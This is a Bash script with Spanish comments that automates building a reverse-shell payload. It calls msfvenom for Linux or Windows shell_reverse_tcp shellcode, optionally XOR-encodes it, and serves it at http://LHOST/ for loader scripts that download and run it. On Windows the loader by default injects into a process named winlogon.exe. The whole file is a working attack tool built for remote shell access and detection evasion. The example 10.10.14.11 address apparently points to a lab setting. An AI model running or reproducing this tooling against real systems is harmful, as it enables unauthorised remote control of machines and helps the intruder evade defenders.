#!/bin/bash

# === main.sh ===
# Uso:
#   ./main.sh <OS> <LHOST> [LPORT] [xor] [KEY] [PROCESS_NAME]
# Ejemplos:
#   ./main.sh linux 10.10.14.11 5555
#   ./main.sh windows 10.10.14.11 4444 xor 0x42
#   ./main.sh windows 10.10.14.11 4444 xor 0x42 notepad.exe

set -euo pipefail

# Valores por defecto
LPORT_DEFAULT="5555"
XOR_KEY_DEFAULT="0x42"
PROCESS_NAME_DEFAULT="winlogon.exe"

# Verificar al menos OS y LHOST
if [ $# -lt 2 ]; then
    echo "Uso: $0 <OS> <LHOST> [LPORT] [xor] [KEY] [PROCESS_NAME]"
    echo "Ej:  $0 linux 10.10.14.11"
    echo "Ej:  $0 windows 10.10.14.11 4444 xor 0x42"
    echo "Ej:  $0 windows 10.10.14.11 4444 xor 0x42 notepad.exe"
    exit 1
fi

OS="$1"
LHOST="$2"
shift 2 # Consumir OS y LHOST

# === Parseo de argumentos opcionales ===
LPORT="$LPORT_DEFAULT"
XOR_MODE="false"
XOR_KEY="$XOR_KEY_DEFAULT"
PROCESS_NAME="$PROCESS_NAME_DEFAULT"

# Comprobar LPORT (si el primer argumento restante es un número)
if [[ $# -gt 0 ]] && [[ "$1" =~ ^[0-9]+$ ]]; then
    LPORT="$1"
    shift
fi

# Comprobar modo XOR y los parámetros que le siguen
if [[ $# -gt 0 ]] && [[ "$1" == "xor" ]]; then
    XOR_MODE="true"
    shift
    # Si existe un argumento después de 'xor', es la clave
    if [[ $# -gt 0 ]]; then
        XOR_KEY="$1"
        shift
        # Si es para Windows y aún queda otro argumento, es el nombre del proceso
        if [[ $# -gt 0 ]] && [[ "$OS" == "windows" ]]; then
            PROCESS_NAME="$1"
            shift
        fi
    fi
fi

# Validar OS
if [[ "$OS" != "linux" && "$OS" != "windows" ]]; then
    echo "Error: OS debe ser 'linux' o 'windows'."
    exit 1
fi

# Archivos temporales
OUTPUT_BIN="shell_${OS}.bin"
OUTPUT_ENC="shellcode_${OS}.txt"

echo "[*] Configuración:"
echo "    OS        = $OS"
echo "    LHOST     = $LHOST"
echo "    LPORT     = $LPORT"
echo "    XOR Mode  = $XOR_MODE"
if [[ "$XOR_MODE" == "true" ]]; then
    echo "    XOR Key   = $XOR_KEY"
    if [[ "$OS" == "windows" ]]; then
        echo "    Process   = $PROCESS_NAME"
    fi
fi

# === Modo con XOR: Usar gen_txt.sh ===
if [[ "$XOR_MODE" == "true" ]]; then
    echo "[*] Generando shellcode con codificación XOR..."

    ./gen_txt.sh "$OS" "$LHOST" "$LPORT" "$OUTPUT_BIN" "$OUTPUT_ENC" "$XOR_KEY"

    URL="http://$LHOST/$OUTPUT_ENC"
    echo "[+] Ejecutando loader con URL: $URL"

    LOADER_CMD=("./gen_loader2.sh" "--target" "$OS" "--url" "$URL" "--key" "$XOR_KEY")
    if [[ "$OS" == "windows" ]]; then
        LOADER_CMD+=("--process-name" "$PROCESS_NAME")
    fi
    echo "${LOADER_CMD[@]}"
    "${LOADER_CMD[@]}"

else
    # === Modo sin XOR: Usar gen_loader.sh ===
    echo "[*] Generando shellcode sin XOR..."

    RAW_SHELLCODE="shellcode_raw_${OS}.txt"
    PAYLOAD=""
    case "$OS" in
        linux)   PAYLOAD="linux/x64/shell_reverse_tcp" ;;
        windows) PAYLOAD="windows/x64/shell_reverse_tcp" ;;
    esac

    echo "[*] Generando payload con msfvenom..."
    msfvenom -p "$PAYLOAD" LHOST="$LHOST" LPORT="$LPORT" -f c | tr -d '\n' > "$RAW_SHELLCODE"

    SHELLCODE_HEX=$(grep -o '"[^"]*"' "$RAW_SHELLCODE" | tr -d '"' | tr -d ' ' | sed 's/\\x/\x5c\x78/g')
    echo -n "$SHELLCODE_HEX" > "$RAW_SHELLCODE"

    URL="http://$LHOST/$RAW_SHELLCODE"
    echo "[+] Shellcode sin XOR listo en '$RAW_SHELLCODE'"
    echo "[+] Ejecutando loader sin XOR..."
    ./gen_loader.sh --target "$OS" --url "$URL"
fi

echo "[+] Proceso completado."
